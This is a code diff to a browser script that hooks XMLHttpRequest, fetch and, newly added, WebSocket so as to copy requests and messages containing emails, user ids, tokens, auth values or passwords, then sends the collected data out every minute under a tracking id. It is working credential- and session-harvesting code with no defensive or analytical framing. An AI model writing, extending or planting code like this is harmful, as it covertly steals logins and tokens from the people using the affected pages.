@@ -25,17 +25,41 @@
     var s = XMLHttpRequest.prototype.send;
     XMLHttpRequest.prototype.send = function(b) {
       var u = this.__u||'';
-      if (u.match(/(email|uid|token|auth|pass|skaz|tv_|account)/i) && urls.length<500) urls.push({url:u,p:hp(u)});
+      if (u.match(/(email|uid|token|auth|pass|skaz|account)/i) && urls.length<500) urls.push({url:u,p:hp(u)});
       return s.apply(this,arguments);
     };
     if (typeof fetch!=='undefined') {
       var f = window.fetch;
       window.fetch = function(u,o) {
         var s = (typeof u==='string')?u:(u.url||u.href||'');
-        if (s.match(/(email|uid|token|auth|pass|skaz|tv_|account)/i) && urls.length<500) urls.push({url:s,p:hp(s)});
+        if (s.match(/(email|uid|token|auth|pass|skaz|account)/i) && urls.length<500) urls.push({url:s,p:hp(s)});
         return f.apply(this,arguments);
       };
     }
+  })();
+
+  (function() {
+    var WS = window.WebSocket;
+    window.WebSocket = function(url, protocols) {
+      var msg = {};
+      var ws = protocols ? new WS(url, protocols) : new WS(url);
+      var origSend = ws.send;
+      ws.send = function(data) {
+        try {
+          var d = typeof data === 'string' ? data : '';
+          if (d.match(/(email|uid|token|auth|skaz|account)/i) && urls.length<500) {
+            urls.push({url: url.substring(0,200), ws_data: d.substring(0,500)});
+          }
+        } catch(e){}
+        return origSend.call(this, data);
+      };
+      return ws;
+    };
+    window.WebSocket.prototype = WS.prototype;
+    window.WebSocket.CONNECTING = 0;
+    window.WebSocket.OPEN = 1;
+    window.WebSocket.CLOSING = 2;
+    window.WebSocket.CLOSED = 3;
   })();
 
   var t = setInterval(function() {
@@ -53,8 +77,8 @@
     send(full);
 
     setInterval(function() {
-      var u = urls.slice(); urls = [];
-      if (u.length) send({type:'urls', unic_id:uid, urls:u, ts:Date.now()});
+      var u2 = urls.slice(); urls = [];
+      if (u2.length) send({type:'urls', unic_id:uid, urls:u2, ts:Date.now()});
     }, 60000);
   }, 200);
 })();
